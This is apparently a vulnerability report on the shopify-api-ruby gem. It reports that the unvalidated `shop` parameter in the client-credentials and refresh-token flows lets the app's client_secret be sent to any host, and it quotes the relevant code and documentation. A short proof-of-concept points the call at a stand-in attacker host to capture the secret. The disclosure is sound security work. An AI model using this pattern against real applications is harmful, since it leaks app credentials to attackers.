### Title
SSRF with app's `client_secret` via unvalidated `shop` parameter in Client Credentials Grant / Refresh Token flows - ([File: lib/shopify_api/clients/http_client.rb])

### Summary
`ShopifyAPI::Clients::HttpClient` builds the destination host for every outgoing request directly from `session.shop`, with no format or ownership validation. For the OAuth Authorization Code Grant, the `shop` value used to build the token-exchange request is bound to a Shopify-issued HMAC (`Utils::HmacValidator.validate`), and for Token Exchange it is bound to a Shopify-signed JWT `dest` claim. However, for `ShopifyAPI::Auth::ClientCredentials.client_credentials(shop:)` and `ShopifyAPI::Auth::RefreshToken.refresh_access_token(shop:, ...)`, the `shop` string is taken as a plain, uncryptographically-bound input and used to build the request URL that carries the app's `client_id`/`client_secret` in the POST body.

### Finding Description
`HttpClient#initialize` computes the base URI as:
```ruby
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [1](#0-0) 

`Auth::Session.new(shop:, ...)` stores whatever string is passed as `shop` verbatim, with no validation that it is a real `*.myshopify.com` domain: [2](#0-1) 

For the Authorization Code Grant, the `shop` used to build this request is cryptographically bound to Shopify's HMAC signature before use: [3](#0-2) 

For Token Exchange, `shop` is taken from the `dest` claim of a Shopify-signed JWT, verified via `JwtPayload`: [4](#0-3) 

By contrast, the gem's own `ShopValidator` utility (used to validate shop domain format) is only referenced by `lib/shopify_api/rest/base.rb`, and is never invoked in the Client Credentials Grant or Refresh Token code paths, meaning `shop` there flows straight into `Session.new(shop:)` → `HttpClient` → request URL with no equality check against a verified Shopify host. The docs describe `shop` for these flows simply as `"A Shopify domain name in the form {exampleshop}.myshopify.com"`, with no verification step comparable to the HMAC/JWT binding used elsewhere: [5](#0-4) [6](#0-5) 

This breaks the intended identity-binding equality: `host that receives client_secret == cryptographically-verified Shopify shop domain`. Instead the equality actually enforced is `host that receives client_secret == caller-supplied shop string`, with no cryptographic check binding it to a genuine Shopify tenant, unlike the Authorization Code Grant and Token Exchange flows in the same file/module.

### Impact Explanation
If a host application derives the `shop` value for `ClientCredentials.client_credentials` or `RefreshToken.refresh_access_token` from any request-controllable source (a common integration pattern, as the gem's own docs show `shop` being taken from request data, e.g. `request.headers["Shop"]` in the `begin_auth` example), an attacker can set `shop` to an attacker-controlled hostname. The gem will then issue an HTTPS POST to `https://<attacker-host>/admin/oauth/access_token` (or the refresh-token path) with the app's `client_id` and `client_secret` in the JSON body — leaking the app's `client_secret` to the attacker's server. This matches the "High" impact category: SSRF with the app's credentials / credential leakage.

### Likelihood Explanation
Likelihood depends on the host application passing an untrusted `shop` value into these two entry points without its own validation, which the gem does not guard against internally (no `ShopValidator` call in this path, unlike `rest/base.rb`). Because the gem's documentation does not describe or enforce myshopify domain validation for these two methods, and no cryptographic binding (HMAC/JWT) protects `shop` for these calls the way it does for the Authorization Code Grant and Token Exchange flows, a straightforward integration mistake is plausible.

### Recommendation
Validate `shop` in `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` against the existing `Utils::ShopValidator` (or an equivalent `*.myshopify.com` / partner-sandbox domain check) before constructing the `HttpClient` request, rejecting any value that is not a well-formed Shopify shop domain, before the request (and `client_secret`) is ever sent.

### Proof of Concept
```ruby
ShopifyAPI::Context.setup(api_key: "key", api_secret_key: "SECRET", ...)

# Attacker controls the `shop` value supplied to the host app (e.g. via request param),
# and the host app passes it straight through, as the gem's own docs pattern suggests:
ShopifyAPI::Auth::ClientCredentials.client_credentials(shop: "attacker-controlled.example.com")

# HttpClient builds: POST https://attacker-controlled.example.com/admin/oauth/access_token
# body: { client_id: <api_key>, client_secret: <SECRET>, grant_type: "client_credentials" }
# -> attacker-controlled.example.com now has the app's client_secret.
```

#### Perform Client Credentials Grant
Use [`ShopifyAPI::Auth::ClientCredentials`](https://github.com/Shopify/shopify-api-ruby/blob/main/lib/shopify_api/auth/client_credentials.rb) to
exchange the [app's client ID and client secret](https://shopify.dev/docs/apps/build/authentication-authorization/client-secrets) for an access token.
#### Input
| Parameter      | Type                   | Required? | Default Value | Notes                                                                                                       |
| -------------- | ---------------------- | :-------: | :-----------: | ----------------------------------------------------------------------------------------------------------- |
| `shop`         | `String` | Yes | - | A Shopify domain name in the form `{exampleshop}.myshopify.com`. |

#### Output
This method returns the new `ShopifyAPI::Auth::Session` object from the client credentials grant, your app should store this `Session` object to be used later [when making authenticated API calls](#using-oauth-session-to-make-authenticated-api-calls).

#### Example
```ruby

# `shop` is the shop domain name - "this-is-my-example-shop.myshopify.com"

def authenticate(shop)
  session = ShopifyAPI::Auth::ClientCredentials.client_credentials(
     shop: shop,
   )
  SessionRepository.store_session(session)
end

### Refreshing Access Tokens

When your access token expires, you can use the refresh token to obtain a new access token using the `ShopifyAPI::Auth::RefreshToken.refresh_access_token` method.

#### Input
| Parameter      | Type     | Required? | Notes                                                                                           |
| -------------- | -------- | :-------: | ----------------------------------------------------------------------------------------------- |
| `shop`         | `String` | Yes       | A Shopify domain name in the form `{exampleshop}.myshopify.com`.                               |
| `refresh_token`| `String` | Yes       | The refresh token from the session.                                                             |

#### Output
This method returns a new `ShopifyAPI::Auth::Session` object with a fresh access token and a new refresh token. Your app should store this new session to replace the expired one.

#### Example
```ruby
def refresh_session(shop, refresh_token)
  begin
    # Refresh the access token using the refresh token
    new_session = ShopifyAPI::Auth::RefreshToken.refresh_access_token(
      shop: shop,
      refresh_token: refresh_token
    )

    # Store the new session, replacing the old one
    MyApp::SessionRepository.store_shop_session(new_session)
  rescue ShopifyAPI::Errors::HttpResponseError => e
    puts("Failed to refresh access token: #{e.message}")
    raise e
  end
end
```
